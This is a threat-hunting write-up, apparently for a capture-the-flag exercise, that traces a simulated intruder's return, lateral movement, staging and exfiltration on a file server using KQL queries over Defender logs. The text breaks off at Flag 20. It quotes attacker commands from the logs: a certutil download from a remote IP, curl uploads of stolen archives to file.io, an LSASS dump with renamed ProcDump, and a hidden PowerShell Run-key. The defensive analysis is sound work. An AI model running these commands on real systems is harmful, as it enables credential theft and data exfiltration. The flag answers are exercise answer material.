# THE AZUKI BREACH SAGA - Part 2: Cargo Hold

<img width="641" height="1037" alt="Screenshot 2026-01-08 at 8 27 54 PM" src="https://github.com/user-attachments/assets/c72df5dc-48fc-4fd1-8c64-e5748dad6c59" />

## Executive Summary

This report documents the findings from Part 2 of the threat hunting investigation conducted on Azuki Import/Export Trading Co. After establishing initial access on November 19th, network monitoring detected the attacker returning approximately 54 hours later on November 22nd. The investigation revealed lateral movement to the file server (azuki-fileserver01), extensive data collection from file shares containing sensitive business information including administrator passwords, and exfiltration of compressed archives to an anonymous file sharing service (file.io).

The attacker demonstrated increased sophistication compared to Part 1, using ProcDump instead of Mimikatz for credential extraction, leveraging legitimate Windows directories for staging, and establishing persistence through registry Run keys with masqueraded filenames.

---

## Scenario Overview

### Incident Brief

| Field | Detail |
|-------|--------|
| Company | Azuki Import/Export Trading Co. (梓貿易株式会社) |
| Situation | Attacker returned ~54 hours after initial access; suspicious lateral movement and large data transfers observed overnight on the file server |
| Compromised Systems | azuki-sl (initial beachhead), azuki-fileserver01 (file server) |
| Evidence Available | Microsoft Defender for Endpoint logs (via Azure Log Analytics) |

### Investigation Scope

| Parameter | Value |
|-----------|-------|
| Time Period | November 22 - December 6, 2025 |
| Active Attack Period | November 22, 2025, 12:27 AM - 2:26 AM |
| Target Devices | azuki-sl, azuki-fileserver01 |
| Data Source | Microsoft Defender for Endpoint logs (Azure Log Analytics) |

> **Note:** This threat hunt was initiated on December 6, 2025, establishing the end date for the investigation scope. The active attack period was confined to November 22, 2025, with the attacker completing their operations within approximately 2 hours.

### Supporting Documents

- [Attack Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-2-cargo-hold/docs/chronological-timeline.md) - Chronological breakdown of attacker activity
- [Indicators of Compromise](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-2-cargo-hold/docs/indicators-of-compromise.md) - Complete IOC list

### Connection to Part 1

| Item from Part 1 | Relevance to Part 2 |
|------------------|---------------------|
| Initial Access Date | November 19, 2025, 6:36 PM |
| Initial Compromised Host | azuki-sl (IT admin workstation) |
| Compromised Accounts | kenji.sato (reused), fileadmin (reused) |
| C2 Server | 78.141.196.6 (reused with different ports) |
| Lateral Movement Target | 10.1.0.188 (now confirmed as azuki-fileserver01) |

---

## Findings

### Flag 1: Initial Access - Return Connection Source

**Objective:** Identify the source IP address of the attacker's return connection after the initial compromise.

**Query Used:**
```kql
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-19) .. datetime(2025-12-06))
| where ActionType == "LogonSuccess"
| where LogonType in ("Network", "RemoteInteractive")
| where RemoteIP != "" and RemoteIP !startswith "10."
| order by TimeGenerated asc 
| project TimeGenerated, AccountName, ActionType, LogonType, RemoteIP
```
<img width="1200" alt="1" src="https://github.com/user-attachments/assets/a9e8dadd-fa00-4931-84df-0e549c1a22d7" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 12:27:53 AM |
| Return IP | 159.26.106.98 |
| Account Used | kenji.sato |
| Logon Type | Network |
| Target Device | azuki-sl |

**Analysis:**

The attacker returned to the compromised environment approximately 54 hours after the initial breach, connecting from a new external IP address (159.26.106.98) rather than the original access IP (88.97.178.12). A review of logon events between November 19th and November 22nd confirmed no attacker activity during this period, establishing a clear dwell time gap. This infrastructure rotation is a common technique used by sophisticated threat actors to evade IP-based detection and blocklists. The return connection occurred during off-hours (12:27 AM local time), consistent with JADE SPIDER's operational pattern of conducting activities when legitimate users are unlikely to be monitoring systems. The attacker continued to use the previously compromised kenji.sato account, indicating the credentials had not been reset following the initial intrusion.

**MITRE ATT&CK Reference:**
- External Remote Services (T1133)
- Valid Accounts (T1078)

**Flag Answer:** `159.26.106.98`

---

### Flag 2: Lateral Movement - Compromised Device

**Objective:** Identify the compromised file server device name.

**Query Used:**

*Step 1: Identify lateral movement target IP*
```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where TimeGenerated between (datetime(2025-11-22) .. datetime(2025-12-06))
| where ProcessCommandLine contains "mstsc"
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```
<img width="1200" alt="2(1)" src="https://github.com/user-attachments/assets/41ed2777-4aa8-4149-9bfb-f80a1c8df293" />

*Step 2: Correlate IP to device name*
```kql
DeviceLogonEvents
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where DeviceName != "azuki-sl"
| order by TimeGenerated asc 
| project TimeGenerated, AccountName, ActionType, DeviceName, LogonType, RemoteDeviceName, RemoteIP
```
<img width="1200" alt="2(2)" src="https://github.com/user-attachments/assets/fb9ebb02-2d97-4df7-9644-e5e326cd60ab" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 12:38:49 AM |
| Lateral Movement Command | mstsc.exe /V:10.1.0.188 |
| Target IP | 10.1.0.188 |
| Device Name | azuki-fileserver01 |
| Account Used | fileadmin |
| Source Device | azuki-sl |
| Source IP | 10.1.0.204 |

**Analysis:**

Approximately 11 minutes after the return connection, the attacker moved laterally from azuki-sl to the file server named azuki-fileserver01 (IP: 10.1.0.188). The attacker used the fileadmin account credentials that were likely harvested during the initial compromise via Mimikatz. The lateral movement was initiated via mstsc.exe (Remote Desktop Client) executed from PowerShell, demonstrating continued use of living-off-the-land techniques. The file server represents a high-value target, consistent with JADE SPIDER's objective of stealing business-critical data such as supplier contracts and pricing information.

**MITRE ATT&CK Reference:**
- Remote Services: Remote Desktop Protocol (T1021.001)
- Use Alternate Authentication Material (T1550)

**Flag Answer:** `azuki-fileserver01`

---

### Flag 3: Lateral Movement - Compromised Account

**Objective:** Identify the compromised administrator account used for lateral movement.

**Reference:** This finding was derived from the same query results as Flag 2.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 12:38:49 AM |
| Account | fileadmin |
| Target Device | azuki-fileserver01 |
| Logon Type | Network |
| Source Device | azuki-sl |

**Analysis:**

The attacker used the fileadmin account to access the file server. This account name suggests it has administrative privileges specifically for file management operations, making it a high-value target for an attacker seeking to access and exfiltrate sensitive business data. The credentials were likely harvested during the initial compromise on November 19th when the attacker executed Mimikatz (mm.exe sekurlsa::logonpasswords). The continued use of these credentials on November 22nd indicates that password resets were not performed after the initial breach, allowing the attacker to maintain access.

**MITRE ATT&CK Reference:**
- Valid Accounts (T1078)

**Flag Answer:** `fileadmin`

---

### Flag 4: Discovery - Share Enumeration Command

**Objective:** Identify the command used to enumerate local network shares on the file server.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" and AccountName == "fileadmin"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where ProcessCommandLine has_any ("net", "Get-SmbShare")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```
<img width="1200" alt="4 5" src="https://github.com/user-attachments/assets/8715ba38-b2ce-4792-90a6-96e264556839" />

**Finding:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| Nov 22, 12:40:33 AM | `net.exe user` | User enumeration |
| Nov 22, 12:40:46 AM | `net.exe localgroup administrators` | Admin group enumeration |
| Nov 22, 12:40:54 AM | `net.exe share` | Local share enumeration |
| Nov 22, 12:41:16 AM | `net.exe localgroup administrators` | Admin group enumeration (repeat) |
| Nov 22, 12:42:01 AM | `net.exe view \\10.1.0.188` | Remote share enumeration |

**Analysis:**

Approximately 2 minutes after gaining access to the file server, the attacker conducted systematic discovery activities. The attacker executed `net.exe share` to enumerate local network shares, which reveals all shared folders available on the file server. This command is a standard reconnaissance technique used to identify accessible data repositories before collection.

The discovery sequence shows a methodical approach: first enumerating users, then identifying administrator accounts, followed by share discovery, and finally viewing available network resources. All commands were executed via PowerShell, consistent with the attacker's continued use of living-off-the-land techniques.

**MITRE ATT&CK Reference:**
- Network Share Discovery (T1135)
- Account Discovery: Local Account (T1087.001)
- Permission Groups Discovery: Local Groups (T1069.001)

**Flag Answer:** `net share`

---

### Flag 5: Discovery - Remote Share Enumeration

**Objective:** Identify the command used to enumerate remote shares.

**Reference:** This finding was derived from the same query results as Flag 4.

<img width="1200" alt="4 5" src="https://github.com/user-attachments/assets/8715ba38-b2ce-4792-90a6-96e264556839" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 12:42:01 AM |
| Command | `"net.exe" view \\10.1.0.188` |
| Account | fileadmin |
| Device | azuki-fileserver01 |

**Analysis:**

The attacker executed `net.exe view \\10.1.0.188` to enumerate available shares on the remote system. The `net view` command with a UNC path (\\IP_ADDRESS) queries a remote system for its shared resources, revealing folder names, share types, and descriptions. Interestingly, the attacker targeted 10.1.0.188, which is the file server's own IP address, essentially querying the local system via its network address. This technique can reveal shares that may not appear in a local `net share` query, such as hidden administrative shares or shares accessible only via specific network paths.

**MITRE ATT&CK Reference:**
- Network Share Discovery (T1135)

**Flag Answer:** `"net.exe" view \\10.1.0.188`

---

### Flag 6: Discovery - Privilege Enumeration

**Objective:** Identify the command used to enumerate user privileges.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" and AccountName == "fileadmin"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where ProcessCommandLine has_any ("whoami")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```
<img width="1200" alt="6" src="https://github.com/user-attachments/assets/8f1c3b0b-9114-42e3-b9c0-62ea8e1995cd" />

**Finding:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| Nov 22, 12:40:09 AM | `"whoami.exe"` | Basic identity check |
| Nov 22, 12:42:24 AM | `"whoami.exe" /all` | Comprehensive privilege enumeration |

**Analysis:**

The attacker executed `whoami.exe /all` to retrieve comprehensive information about their current security context. This command displays the current username, security identifier (SID), group memberships (local and domain), and all assigned privileges. The `/all` flag provides the most complete picture of the user's access rights, helping the attacker determine what actions can be performed and whether privilege escalation is necessary.

The attacker first ran a basic `whoami.exe` command to confirm their identity, then followed up with the more detailed `/all` variant approximately 2 minutes later to fully understand their security context on the file server.

**MITRE ATT&CK Reference:**
- System Owner/User Discovery (T1033)

**Flag Answer:** `"whoami.exe" /all`

---

### Flag 7: Discovery - Network Configuration Command

**Objective:** Identify the command used to enumerate network configuration.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" and AccountName == "fileadmin"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where ProcessCommandLine has_any ("arp", "ipconfig", "nbtstat", "route")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```
<img width="1200" alt="7" src="https://github.com/user-attachments/assets/00d3ef57-7fda-4686-bea0-f3ee68de9f2f" />

**Finding:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| Nov 22, 12:42:46 AM | `"ipconfig.exe" /all` | Detailed network configuration |
| Nov 22, 12:42:50 AM | `"ARP.EXE" -a` | Local network device discovery |

**Analysis:**

The attacker executed `ipconfig.exe /all` to retrieve comprehensive network configuration details from the file server. The `/all` flag provides extended information beyond basic IP addresses, including DNS server addresses, DHCP configuration, MAC addresses, domain membership, and network adapter details. This information helps the attacker understand the network topology, identify domain controllers, and discover additional network segments for further lateral movement.

The attacker followed up immediately with `arp -a` to enumerate devices on the local network segment, consistent with the reconnaissance pattern observed during the initial compromise on azuki-sl.

**MITRE ATT&CK Reference:**
- System Network Configuration Discovery (T1016)

**Flag Answer:** `"ipconfig.exe" /all`

---

### Flag 8: Defense Evasion - Directory Hiding Command

**Objective:** Identify the command used to hide the staging directory on the file server.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" and AccountName == "fileadmin"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where ProcessCommandLine has "attrib"
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```
<img width="1200" alt="8" src="https://github.com/user-attachments/assets/a16fd588-2a7b-47ed-b350-4793a4425504" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 12:55:43 AM |
| Command | `"attrib.exe" +h +s C:\Windows\Logs\CBS` |
| Account | fileadmin |
| Device | azuki-fileserver01 |

**Analysis:**

The attacker used `attrib.exe +h +s` to hide a staging directory on the file server, applying both the Hidden (`+h`) and System (`+s`) attributes. Unlike the initial compromise where the attacker created a custom staging directory (`C:\ProgramData\WindowsCache`), on the file server they chose to use `C:\Windows\Logs\CBS`, an existing legitimate Windows directory used for Component-Based Servicing logs. This technique is more sophisticated as it blends the staging location with legitimate OS components, making it even harder to detect. The combination of Hidden and System attributes makes the directory invisible in standard file explorer views and gives it the appearance of a protected operating system folder.

**MITRE ATT&CK Reference:**
- Hide Artifacts: Hidden Files and Directories (T1564.001)

**Flag Answer:** `"attrib.exe" +h +s C:\Windows\Logs\CBS`

---

### Flag 9: Collection - Staging Directory Path

**Objective:** Identify the data staging directory path on the file server.

**Reference:** This finding was derived from the same query results as Flag 8.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 12:55:43 AM |
| Staging Directory | C:\Windows\Logs\CBS |
| Hidden By | `attrib.exe +h +s` |
| Device | azuki-fileserver01 |

**Analysis:**

The attacker established `C:\Windows\Logs\CBS` as the staging directory on the file server. This location was strategically chosen because it is a legitimate Windows directory used for Component-Based Servicing logs, making it less likely to raise suspicion during casual inspection. Unlike the staging directory used on azuki-sl (`C:\ProgramData\WindowsCache`), this approach leverages an existing system folder rather than creating a new one, further reducing the attacker's footprint. This directory would be used to stage tools, collected data, and archives prior to exfiltration.

**MITRE ATT&CK Reference:**
- Data Staged: Local Data Staging (T1074.001)

**Flag Answer:** `C:\Windows\Logs\CBS`

---

### Flag 10: Defense Evasion - Script Download Command

**Objective:** Identify the command used to download the PowerShell script to the file server.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" and AccountName == "fileadmin"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where ProcessCommandLine has_any ("certutil", "Invoke-WebRequest", "url", "wget")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```
<img width="1200" alt="10" src="https://github.com/user-attachments/assets/8ff3d22f-a1b7-4b2c-a0d6-a9f67fd0d146" />

**Finding:**

| Timestamp | Command | Port |
|-----------|---------|------|
| Nov 22, 12:56:47 AM | `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1` | 7331 |
| Nov 22, 12:58:24 AM | `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1` | 7331 |
| Nov 22, 1:02:59 AM | `"certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1` | 8080 |

**Analysis:**

The attacker used `certutil.exe` to download a PowerShell script (`ex.ps1`) from the same attacker-controlled server identified in Part 1 (78.141.196.6). The script was saved directly to the staging directory (`C:\Windows\Logs\CBS`). Notably, the attacker attempted the download multiple times, initially using port 7331 and later switching to port 8080. This could indicate the attacker was troubleshooting connectivity issues or rotating between different services on their infrastructure. The use of `certutil.exe` for downloads is consistent with the attacker's living-off-the-land approach observed throughout the intrusion.

**MITRE ATT&CK Reference:**
- Ingress Tool Transfer (T1105)
- System Binary Proxy Execution (T1218)

**Flag Answer:** `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`

---

### Flag 11: Collection - Credential File Discovery

**Objective:** Identify the credential file created in the staging directory.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where FileName contains ".csv"
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine
```
<img width="1200" alt="11" src="https://github.com/user-attachments/assets/81e2b2fb-e28d-478e-8519-7a73b0b328ac" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 1:07:53 AM |
| Filename | IT-Admin-Passwords.csv |
| Full Path | C:\Windows\Logs\CBS\it-admin\IT-Admin-Passwords.csv |
| Created By | `xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y` |

**Analysis:**

The attacker discovered and copied a credential file named `IT-Admin-Passwords.csv` from a file share (`C:\FileShares\IT-Admin`) to the staging directory. The file name clearly indicates it contains administrator passwords, representing a critical security exposure. The file was copied using `xcopy.exe` with flags to include subdirectories (`/E`), create directories if needed (`/I`), include hidden files (`/H`), and suppress overwrite prompts (`/Y`).

This finding reveals poor security hygiene at Azuki Import/Export - storing administrator credentials in a plaintext CSV file on a file share. This type of unsecured credential storage is a common finding in breaches and likely provided the attacker with additional accounts and access vectors.

**MITRE ATT&CK Reference:**
- Unsecured Credentials: Credentials In Files (T1552.001)
- Data from Local System (T1005)

**Flag Answer:** `IT-Admin-Passwords.csv`

---

### Flag 12: Collection - Recursive Copy Command

**Objective:** Identify the command used to stage data from a network share.

**Reference:** This finding was derived from the same query results as Flag 11.

<img width="1200" alt="11" src="https://github.com/user-attachments/assets/ff44af79-462d-4bc6-a456-c01becfab774" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 1:07:53 AM |
| Command | `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y` |
| Source | C:\FileShares\IT-Admin |
| Destination | C:\Windows\Logs\CBS\it-admin |

**Analysis:**

The attacker used `xcopy.exe` to recursively copy the contents of a file share to the staging directory. The command-line flags reveal the attacker's methodology:

| Flag | Purpose |
|------|---------|
| `/E` | Copy directories and subdirectories, including empty ones |
| `/I` | Assume the destination is a directory if it doesn't exist |
| `/H` | Copy hidden and system files |
| `/Y` | Suppress prompts to confirm overwriting files |

This combination ensures a complete, silent copy of all data including hidden files, without requiring user interaction. The use of `xcopy.exe`, a native Windows utility, is consistent with the attacker's living-off-the-land approach, reducing the likelihood of triggering security alerts compared to third-party tools.

**MITRE ATT&CK Reference:**
- Automated Collection (T1119)
- Data Staged: Local Data Staging (T1074.001)
- Data from Network Shared Drive (T1039)

**Flag Answer:** `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`

---

### Flag 13: Collection - Compression Command

**Objective:** Identify the command used to compress the staged collection data.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" and AccountName == "fileadmin"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where ProcessCommandLine has_any ("tar", "rar", "zip", "7z")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```

<img width="1200" alt="13 16 17" src="https://github.com/user-attachments/assets/58efb65d-1dad-4882-bccc-7c3e83f50f7e" />

**Finding:**

| Timestamp | Command | Archive Created |
|-----------|---------|-----------------|
| Nov 22, 1:27:31 AM | `"tar.exe" --version` | Version check |
| Nov 22, 1:28:55 AM | `"tar.exe" -czf C:\Windows\Logs\CBS\financial.tar.gz -C C:\Windows\Logs\CBS\financial .` | financial.tar.gz |
| Nov 22, 1:30:10 AM | `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .` | credentials.tar.gz |
| Nov 22, 1:41:33 AM | `"tar.exe" -czf C:\Windows\Logs\CBS\shipping.tar.gz -C C:\Windows\Logs\CBS\shipping .` | shipping.tar.gz |

**Analysis:**

The attacker used `tar.exe` to compress the staged credential data from the IT-Admin folder. The command-line flags reveal the methodology:

| Flag | Purpose |
|------|---------|
| `-c` | Create new archive |
| `-z` | Compress using gzip |
| `-f` | Specify archive filename |
| `-C` | Change to directory before operation |
| `.` | Archive current directory contents |

The attacker systematically compressed three categories of stolen data: financial records, credentials (from IT-Admin folder containing `IT-Admin-Passwords.csv`), and shipping information. The use of `tar.exe`, while native to Windows 10+, is a cross-platform utility commonly found on Linux systems, suggesting the attacker may be more familiar with Unix-like environments or preparing data for Linux-based infrastructure.

Note: There are a few other interesting results from this query that indicate data exfiltration, which are covered in Flags 16 and 17.

**MITRE ATT&CK Reference:**
- Archive Collected Data: Archive via Utility (T1560.001)

**Flag Answer:** `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

---

### Flag 14: Credential Access - Renamed Tool

**Objective:** Identify the renamed credential dumping tool used on the file server.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where FolderPath contains "CBS"
| where FileName endswith ".exe"
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
```
<img width="1200" alt="14" src="https://github.com/user-attachments/assets/2ccd429e-4d93-46ff-ad16-e4688aa71a13" />

**Finding:**

| Timestamp | Action | Filename | Path |
|-----------|--------|----------|------|
| Nov 22, 2:03:19 AM | FileCreated | pd.exe | C:\Windows\Logs\CBS\pd.exe |
| Nov 22, 2:26:23 AM | FileDeleted | pd.exe | C:\Windows\Logs\CBS\pd.exe |

**Analysis:**

The attacker deployed a credential dumping tool renamed to `pd.exe` on the file server. The short, innocuous filename "pd" is likely an abbreviation for "procdump" or "password dumper," designed to blend in with legitimate system utilities. Unlike the initial compromise where the attacker used `mm.exe` (Mimikatz), this different naming convention demonstrates operational security awareness - varying tool names across systems to evade signature-based detection.

Notably, the attacker deleted the tool approximately 23 minutes after creation, indicating anti-forensic discipline. This cleanup activity shows the attacker's intent to minimize artifacts left on compromised systems.

**MITRE ATT&CK Reference:**
- Masquerading: Rename System Utilities (T1036.003)
- OS Credential Dumping (T1003)
- Indicator Removal: File Deletion (T1070.004)

**Flag Answer:** `pd.exe`

---

### Flag 15: Credential Access - Memory Dump Command

**Objective:** Identify the command used to dump process memory for credential extraction.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" and AccountName == "fileadmin"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where FileName == "pd.exe"
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```
<img width="1200" alt="15" src="https://github.com/user-attachments/assets/3d2ec71a-5cba-4616-b143-9a766ba52f4a" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 2:24:44 AM |
| Command | `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` |
| Tool | pd.exe (renamed ProcDump) |
| Output | C:\Windows\Logs\CBS\lsass.dmp |

**Analysis:**

The attacker used `pd.exe`, a renamed version of Sysinternals ProcDump, to dump the LSASS process memory. The command-line arguments reveal the methodology:

| Argument | Purpose |
|----------|---------|
| `-accepteula` | Automatically accept the license agreement (prevents interactive prompt) |
| `-ma` | Create a full memory dump |
| `876` | Process ID (PID) of LSASS |
| `C:\Windows\Logs\CBS\lsass.dmp` | Output dump file location |

Unlike Part 1 where the attacker used Mimikatz (`mm.exe`) directly on azuki-sl, here they used ProcDump to create a memory dump of the LSASS process. This dump file can be exfiltrated and analyzed offline with Mimikatz to extract credentials, which is a stealthier approach as it avoids running Mimikatz directly on the target system. The dump was saved to the staging directory for later exfiltration.

**MITRE ATT&CK Reference:**
- OS Credential Dumping: LSASS Memory (T1003.001)

**Flag Answer:** `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`

---

### Flag 16: Exfiltration - Upload Command

**Objective:** Identify the command used to exfiltrate the staged data.

**Reference:** This finding was derived from the same query results as Flag 13.

<img width="1200" alt="13 16 17" src="https://github.com/user-attachments/assets/58efb65d-1dad-4882-bccc-7c3e83f50f7e" />

**Finding:**

| Timestamp | Command | Data Exfiltrated |
|-----------|---------|------------------|
| Nov 22, 1:59:54 AM | `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` | Credentials archive |
| Nov 22, 2:00:01 AM | `"curl.exe" -F file=@C:\Windows\Logs\CBS\financial.tar.gz https://file.io` | Financial data |
| Nov 22, 2:00:08 AM | `"curl.exe" -F file=@C:\Windows\Logs\CBS\contracts.zip https://file.io` | Contracts |
| Nov 22, 2:00:20 AM | `"curl.exe" -F file=@C:\Windows\Logs\CBS\shipping.tar.gz https://file.io` | Shipping data |

**Analysis:**

The attacker used `curl.exe`, a native Windows utility, to exfiltrate the compressed archives to `https://file.io`, a legitimate file sharing service. The command-line syntax reveals the methodology:

| Argument | Purpose |
|----------|---------|
| `-F` | Form-based file upload (multipart/form-data) |
| `file=@` | Specify file to upload |
| `https://file.io` | Anonymous file sharing service |

The attacker exfiltrated four archives within 26 seconds, demonstrating an automated or scripted approach. The use of `file.io` is significant as it is a legitimate service that provides temporary file hosting with one-time download links, allowing the attacker to retrieve the stolen data anonymously. This technique abuses trusted cloud services to bypass network security controls that might block connections to suspicious infrastructure.

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service (T1567)

**Flag Answer:** `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

---

### Flag 17: Exfiltration - Cloud Service

**Objective:** Identify the cloud service used for data exfiltration.

**Reference:** This finding was derived from the same query results as Flag 13.

<img width="1200" alt="13 16 17" src="https://github.com/user-attachments/assets/58efb65d-1dad-4882-bccc-7c3e83f50f7e" />

**Finding:**

| Field | Value |
|-------|-------|
| Service | file.io |
| URL | https://file.io |
| Files Exfiltrated | credentials.tar.gz, financial.tar.gz, contracts.zip, shipping.tar.gz |

**Analysis:**

The attacker used `file.io`, an anonymous file sharing service, to exfiltrate stolen data. This service is favored by attackers because it requires no authentication or account registration, provides temporary file hosting with auto-deletion after download, generates one-time download links for anonymous retrieval, uses HTTPS encryption to mask data transfers, and is a legitimate service unlikely to be blocked by corporate firewalls.

Unlike Part 1 where the attacker used Discord webhooks for exfiltration, the use of `file.io` in Part 2 demonstrates the attacker's flexibility in choosing exfiltration channels. Both services share common characteristics: they are legitimate platforms that blend with normal business traffic, making detection through network monitoring more challenging.

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)

**Flag Answer:** `file.io`

---

### Flag 18: Persistence - Registry Value Name

**Objective:** Identify the registry value name used to establish persistence.

**Query Used:**
```kql
DeviceRegistryEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where RegistryKey has_any (@"CurrentVersion\Run", "Run", "RunOnce")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
```
<img width="1200" alt="18" src="https://github.com/user-attachments/assets/88cd3ebb-3326-4b75-a915-c4ac74d048ff" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 2:10:50 AM |
| Registry Key | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run |
| Value Name | FileShareSync |
| Value Data | `powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1` |

**Analysis:**

The attacker created a registry Run key entry named "FileShareSync" to establish persistence on the file server. The value name was deliberately chosen to appear as legitimate file synchronization software, blending in with typical enterprise applications. The registry value executes a hidden PowerShell script on every system startup:

| Argument | Purpose |
|----------|---------|
| `-NoP` | No profile (skip loading PowerShell profile) |
| `-W Hidden` | Hidden window (no visible console) |
| `-File` | Execute specified script file |
| `C:\Windows\System32\svchost.ps1` | Malicious script disguised as system file |

The persistence mechanism runs a PowerShell script named `svchost.ps1` placed in the System32 directory, masquerading as the legitimate Windows Service Host. This ensures the attacker maintains access to the file server even after system reboots.

**MITRE ATT&CK Reference:**
- Boot or Logon Autostart Execution: Registry Run Keys (T1547.001)
- Masquerading: Match Legitimate Name or Location (T1036.005)

**Flag Answer:** `FileShareSync`

---

### Flag 19: Persistence - Beacon Filename

**Objective:** Identify the persistence beacon filename.

**Reference:** This finding was derived from the same query results as Flag 18.

<img width="1200" alt="18" src="https://github.com/user-attachments/assets/e7f4591c-6626-4b29-b482-f53ecfa06cca" />

**Finding:**

| Field | Value |
|-------|-------|
| Filename | svchost.ps1 |
| Full Path | C:\Windows\System32\svchost.ps1 |
| Executed By | `powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1` |

**Analysis:**

The attacker named the persistence script `svchost.ps1` to masquerade as the legitimate Windows Service Host (`svchost.exe`). This naming convention is designed to blend into any Windows process listing and avoid suspicion during casual inspection.

This technique mirrors the masquerading approach used during the initial compromise on azuki-sl, where the attacker placed a malicious `svchost.exe` in `C:\ProgramData\WindowsCache`. On the file server, they took it further by placing the script directly in `C:\Windows\System32\`, a trusted system directory where legitimate `svchost.exe` resides.

The combination of using a trusted filename (`svchost`) with a script extension (`.ps1`) in a trusted location (`System32`) demonstrates the attacker's understanding of how defenders review systems for suspicious activity.

**MITRE ATT&CK Reference:**
- Masquerading: Match Legitimate Name or Location (T1036.005)

**Flag Answer:** `svchost.ps1`

---

### Flag 20: Anti-Forensics - History File Deletion

**Objective:** Identify the PowerShell history file that was deleted.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
